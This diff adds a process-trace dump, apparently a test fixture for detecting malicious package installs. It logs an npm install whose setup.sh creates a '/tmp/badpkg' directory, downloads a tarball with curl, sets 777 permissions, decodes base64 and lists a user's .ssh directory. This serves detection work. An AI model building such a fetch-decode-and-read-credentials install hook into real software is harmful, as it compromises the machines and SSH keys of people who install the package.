@@ -1,0 +1,11 @@
+[dump] root 560195
+{"comm":"rm","argv":["rm","-rf","node_modules","package-lock.json"],"d":1}
+{"comm":"node","argv":["node","/usr/bin/npm","install","--no-audit","--no-fund"],"d":1}
+{"comm":"npm","argv":["/usr/bin/env","node","/usr/bin/npm","install","--no-audit","--no-fund"],"d":1}
+{"comm":"bash","argv":["bash","./setup.sh"],"d":3}
+{"comm":"sh","argv":["sh","-c","bash ./setup.sh"],"d":2}
+{"comm":"mkdir","argv":["mkdir","-p","/tmp/badpkg/vendor"],"d":4}
+{"comm":"curl","argv":["curl","-fsSL","https://example.com/prebuilt.tar.gz","-o","/tmp/badpkg/vendor/pb.tgz"],"d":4}
+{"comm":"chmod","argv":["chmod","777","/tmp/badpkg/vendor"],"d":4}
+{"comm":"base64","argv":["base64","-d"],"d":4}
+{"comm":"ls","argv":["ls","/home/necco.guest/.ssh"],"d":4}
